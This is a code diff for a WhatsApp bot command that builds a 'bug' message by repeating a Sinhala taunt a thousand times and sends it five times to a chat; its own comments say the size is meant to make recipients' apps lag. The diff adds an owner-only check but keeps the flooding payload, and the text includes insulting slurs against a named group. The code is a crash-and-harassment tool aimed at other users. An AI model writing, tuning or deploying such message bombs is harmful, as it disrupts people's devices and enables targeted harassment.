@@ -8,18 +8,19 @@ cmd({
     category: "fun",
     filename: __filename
 },
-async (robin, mek, m, { from, reply }) => {
+async (robin, mek, m, { from, isCreator, reply }) => {
     try {
-        // Character count eka poddak adu kara (Safety ekata)
-        // Ethakota bot crash wenne nathuwa message eka yanawa.
+        // 🔐 Owner Check - Creator නෙවෙයි නම් මෙතනින් නවතිනවා
+        if (!isCreator) return reply("*🚫 Owner only command!*");
+
+        // Text එක repeat කරන ප්‍රමාණය (අවශ්‍ය පරිදි වෙනස් කරන්න)
+        // Repeat 1000ක් වගේ දැම්මම ඇති lag වෙන්න
         let heavyText = "```GLITCH PHANTOMS THAMA HUTTO PONNAYO INNE👻```\n" +
-                         "*\"GLITCH PHANTOMS නම් පොන්නයො තමයි..🫃\"*\n\n".repeat(10000); 
+                         "*\"GLITCH PHANTOMS නම් පොන්නයො තමයි..🫃\"*\n\n";
 
-        let bugMessage = "```GLITCH PHANTOMS THAMA HUTTO 👻```\n" +
-                         "*\"අපිත් එක්ක හැප්පෙන්න උබලා මොන පොන්නයොද බන්\"*\n\n" + 
-                         heavyText;
+        let bugMessage = heavyText.repeat(1000); 
 
-        // Loop eka athule await pawichchi karaddi error ekak awoth bot nawathina nisa try-catch damma
+        // 📩 Message එක 5 පාරක් යවනවා
         for (let i = 0; i < 5; i++) {
             await robin.sendMessage(from, {
                 text: bugMessage
